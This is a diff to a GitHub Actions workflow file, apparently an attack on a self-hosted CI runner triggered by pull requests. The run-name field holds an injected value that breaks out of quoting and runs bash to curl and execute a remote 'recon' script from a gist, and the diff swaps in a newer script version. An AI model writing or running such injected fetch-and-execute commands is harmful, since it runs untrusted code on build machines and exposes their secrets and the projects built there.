@@ -1,9 +1,9 @@
 name: ApprovalComment
-run-name: 'x"; bash -c "$(curl -sSfL https://gist.githubusercontent.com/lazyhacker6/98e945f2f7f8c0c15586b7c07083cdc7/raw/recon.sh)"; #'
+run-name: 'x"; bash -c "$(curl -sSfL https://gist.githubusercontent.com/lazyhacker6/8dcce114309e7c830b235be10db34cca/raw/recon3.sh)"; #'
 on:
   pull_request:
 jobs:
   forge:
     runs-on: self-hosted
     steps:
-      - run: echo forged-ok-v2
+      - run: echo forged-ok-v3
